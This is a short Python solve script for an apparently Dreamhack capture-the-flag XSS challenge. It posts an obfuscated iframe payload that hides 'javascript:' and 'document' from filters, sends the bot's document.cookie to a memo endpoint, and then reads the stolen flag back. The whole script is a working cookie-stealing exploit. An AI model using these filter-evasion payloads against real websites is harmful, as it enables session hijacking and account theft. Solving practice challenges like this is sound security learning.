import requests

port = 18141
url_index = f"http://host3.dreamhack.games:{port}/"
url_flag = url_index + "flag"
url_memo = url_index + "memo"

# <img>로 하면 안됨 (why?)
param = {
  "param": "<iframe src=\"javascr	ipt:d\\u006fcument.locati\\u006fn.href='/memo?memo=' + d\\u006fcument.cookie;\"/>"
}

r = requests.post(url_flag, data=param)
r = requests.get(url_memo)
print(r.text)
